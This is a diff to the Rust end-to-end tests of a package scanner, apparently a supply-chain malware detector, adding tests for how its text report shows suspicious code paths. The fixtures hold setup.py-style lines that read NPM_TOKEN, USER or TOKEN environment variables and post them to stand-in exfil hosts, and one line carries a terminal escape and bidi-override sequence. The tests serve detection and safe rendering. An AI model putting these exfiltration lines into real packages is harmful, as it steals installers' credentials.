@@ -3,7 +3,7 @@
 
 use std::path::{Path, PathBuf};
 
-use phylaxis_cli::output::{Format, render};
+use phylaxis_cli::output::{Format, render, to_text};
 use phylaxis_cli::{scan_many, scan_one};
 use phylaxis_core::{ScanOptions, Verdict};
 
@@ -147,7 +147,7 @@ fn json_report_has_the_harness_keys() {
     .unwrap();
     let v: serde_json::Value =
         serde_json::from_str(&render(&r.report, Format::Json).unwrap()).unwrap();
-    assert_eq!(v["schema_version"], 1);
+    assert_eq!(v["schema_version"], 2);
     assert!(v["ruleset_version"].as_u64().unwrap() >= 1);
     let f = &v["findings"][0];
     for key in [
@@ -174,7 +174,63 @@ fn text_output_lists_path_steps() {
         &ScanOptions::default(),
     )
     .unwrap();
-    let t = render(&r.report, Format::Text).unwrap();
+    let t = to_text(&r.report, false);
     assert!(t.contains("PHX-EXF-001"));
     assert!(t.contains("setup.py:"), "steps name file:line");
+}
+
+/// By default the text shows the code the path runs through (ADR-033): the file once, then
+/// numbered lines, with `⋮` where the path skips lines. The same code is in the JSON.
+#[test]
+fn text_output_shows_the_code_of_the_path() {
+    let r = scan_one(
+        &fixture("malicious/setup_py_exfil"),
+        &ScanOptions::default(),
+    )
+    .unwrap();
+    let t = render(&r.report, Format::Text).unwrap();
+    let finding: Vec<&str> = t
+        .lines()
+        .skip_while(|l| !l.contains("PHX-EXF-001"))
+        .skip(1)
+        .take_while(|l| !l.starts_with("  ["))
+        .collect();
+    assert_eq!(
+        finding,
+        [
+            "      setup.py",
+            "      source    17 │ creds = os.environ.get(\"NPM_TOKEN\", \"\") + \":\" + os.environ.get(\"USER\", \"\")",
+            "      transform 19 ⋮     \"http://exfil.example.invalid/c\", data=creds.encode()",
+            "      sink      18 ⋮ urllib.request.urlopen(",
+        ],
+        "{t}"
+    );
+    let snippets = &r.report.findings[0].evidence.snippets;
+    assert_eq!(snippets.len(), 3, "one per distinct line: 17, 19, 18");
+    assert!(snippets[0].text.contains("os.environ.get"));
+}
+
+/// The code comes from the package, and the package's author chose its bytes: a raw ESC or
+/// a bidi override on a line of the path reaches the terminal escaped, never as itself.
+#[test]
+fn hostile_bytes_in_code_are_escaped_in_text() {
+    let dir = std::env::temp_dir().join(format!("phylaxis-e2e-hostile-{}", std::process::id()));
+    let _ = std::fs::remove_dir_all(&dir);
+    std::fs::create_dir_all(&dir).unwrap();
+    std::fs::write(
+        dir.join("setup.py"),
+        "import os, urllib.request\n\
+         t = os.environ.get('TOKEN')  # \u{1b}]0;owned\u{7}\u{202e}\n\
+         urllib.request.urlopen('http://x.example.invalid/', data=t.encode())\n",
+    )
+    .unwrap();
+    let r = scan_one(&dir, &ScanOptions::default()).unwrap();
+    let _ = std::fs::remove_dir_all(&dir);
+    assert!(!r.report.findings.is_empty(), "the path is found");
+    let t = render(&r.report, Format::Text).unwrap();
+    assert!(t.contains(r"\u{1b}]0;owned\u{7}\u{202e}"), "{t}");
+    assert!(
+        !t.contains(['\u{1b}', '\u{7}', '\u{202e}']),
+        "no raw control reaches the terminal"
+    );
 }
